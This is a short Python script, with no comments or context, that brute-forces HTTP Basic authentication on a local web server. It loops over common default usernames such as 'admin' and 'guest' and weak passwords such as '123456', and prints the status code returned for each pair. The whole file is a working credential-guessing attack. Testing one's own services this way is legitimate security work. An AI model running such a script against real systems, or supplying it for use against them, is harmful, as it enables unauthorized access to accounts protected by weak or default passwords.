import requests
import base64
users = ['admin', 'administrator', 'user', 'test', 'guest']
passwords = ['admin', 'password', 'administrator', 'user', 'test', 'guest', '1234', '12345', '123456', 'secret']
for user in users:
    for pwd in passwords:
        auth = base64.b64encode(f'{user}:{pwd}'.encode()).decode()
        headers = {'Authorization': f'Basic {auth}'}
        r = requests.get('http://localhost:80/', headers=headers)
        print(f'{user}:{pwd} => {r.status_code}')
